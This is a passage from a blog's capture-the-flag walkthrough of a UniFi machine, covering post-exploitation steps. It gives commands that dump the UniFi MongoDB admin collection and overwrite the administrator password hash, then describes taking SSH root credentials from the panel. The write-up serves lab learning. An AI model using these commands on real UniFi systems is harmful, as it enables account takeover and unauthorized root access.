<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ps aux <span class="p">|</span> grep mongo
</span></span></code></pre></div><p><img src="checking-mongodb.png" alt="1"></p>
<p>Well, in the article <a href="https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi">sprocketsecurity - another log4j on the fire unifi</a> it talks about cracking the password hash and adding our <code>x_shadow</code> admin but in the <code>official walkthrough</code> did a kinda similar thing but in a more simple way. In this case, you can learn every way to interact or alter the data in <code>MongoDB</code>. I already trying them both but in this writeup, I choose the <code>official walkthrough</code> way to make it not a super long writeup.</p>
<p>In the <a href="https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi">sprocketsecurity - another log4j on the fire unifi</a> article. I saw that they interact with the <code>UniFi</code> database called <code>ace</code>. So, I&rsquo;m thinking let&rsquo;s try it with the <code>ace</code> database and that&rsquo;s the correct DB name. <br>
<em><font color="yellow">ace is the default UniFi database</font></em></p>
<h2 id="dump-userpassword-from-mongodb">dump user/password from mongoDB</h2>
<p>We already know MongoDB exist in victim machine. Now, we can dump user/password from it with this command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mongo --port <span class="m">27117</span> ace --eval <span class="s2">&#34;db.admin.find().forEach(printjson)&#34;</span>
</span></span></code></pre></div><p><img src="admin-hash.png" alt="1"></p>
<p>After we press <code>Enter</code>. The output is so ridiculous its dumps all users, email, password hash, etc. The most important data we want to take a look at is <code>administrator</code>.</p>
<h2 id="change-administrator-x_shadow">change administrator x_shadow</h2>
<p>So, as I said before, I&rsquo;m gonna use the <code>official walkthrough</code> way to change administrator <code>x_shadow</code> but again it is up to you. How you want to approach it.
Well, the first thing we want to do is generate a <code>sha-512</code> hash. To do this we can use the <code>mkpasswd</code> command-line utility. So, the command should look like this:</p>
<h2 id="generate-sha-512-hash">generate sha-512 hash</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkpasswd -m sha-512 yourdesirepassword
</span></span></code></pre></div><p><img src="mkpasswd.png" alt="1"></p>
<p>Let&rsquo;s proceed to replacing the existing hash with one we created. To do it, type this command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mongo --port <span class="m">27117</span> ace --eval <span class="s1">&#39;db.admin.update({&#34;_id&#34;:ObjectId(&#34;61ce278f46e0fb0012d47ee4&#34;)},{$set:{&#34;x_shadow&#34;:&#34;SHA-512 Hash Generated&#34;}})&#39;</span>
</span></span></code></pre></div><p><img src="update-x_shadow.png" alt="1"></p>
<p>Now, we need to verify that the password has been updated in the <code>MongoDB</code> by running the same command to dump the user/password. The hash appears to have been updated.</p>
<p><img src="noice.png" alt="1"></p>
<h2 id="login-page">login page</h2>
<p>Well, let&rsquo;s try login with the username <code>administrator</code> and password to whatever you put it as the hash. In my case, it will be <code>drjohn</code>. DONE!</p>
<p><img src="login_s_admin.png" alt="1"></p>
<h2 id="steal-ssh-creds">steal SSH creds</h2>
<p>The Nmap scan result previously shows that <code>port 22/SSH</code> is open. To gain access through SSH we must need a valid credential. However, luck is on our side. We can grab ssh credentials by navigating to the setting page by clicking the bottom left button that looks like a gear. Then, scroll down.</p>
<p><img src="stel_ssh.png" alt="1"></p>
<h2 id="ssh-as-root">ssh as root</h2>
<p>Let&rsquo;s log in as root with the creds we found. SUCCESS!!!</p>
<p><img src="root_ssh.png" alt="1"></p>

            </div>
        </article></main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/hugo-sid" target="_blank" rel="noopener noreferrer me"
    title="Github">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
<a href="https://twitter.com" target="_blank" rel="noopener noreferrer me"
    title="Twitter">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
    </path>
</svg>
</a>
<a href="index.xml" target="_blank" rel="noopener noreferrer me"
    title="Rss">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path d="M4 11a9 9 0 0 1 9 9" />
    <path d="M4 4a16 16 0 0 1 16 16" />
    <circle cx="5" cy="19" r="1" />
</svg>
</a>
</div>
    <small class="footer_copyright">
        © 2023 shafiqaiman.
        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
    </small>
</footer><a href="#" title="Go to top" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    




    
    
        
    

    
    
        
    



    
    <script src="http://example.com/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>

    

</body>
</html>
